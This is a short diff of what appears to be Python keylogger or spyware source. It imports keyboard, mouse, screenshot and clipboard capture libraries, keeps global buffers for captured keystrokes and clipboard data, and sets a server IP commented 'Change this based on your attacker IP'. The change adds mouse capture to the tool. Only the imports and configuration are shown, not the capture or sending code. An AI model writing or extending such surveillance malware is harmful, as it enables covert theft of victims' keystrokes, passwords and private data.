@@ -24,12 +24,12 @@ import base64
 import time
 import mss
 import signal
-from pynput import keyboard
+from pynput import keyboard, mouse
 
 # Global variables to store captured data
 keystrokes = ""  # Buffer to store captured keystrokes
-clipboard_data = ""  # Global variable to store clipboard content
-previous_clipboard_data = ""  # To track the previous clipboard content
+clipboard_data = ""  # Buffer to store clipboard content
+previous_clipboard_data = ""  # Buffer to track the previous clipboard content
 
 # Configuration settings
 server_ip = "127.0.0.1"  # Change this based on your attacker IP
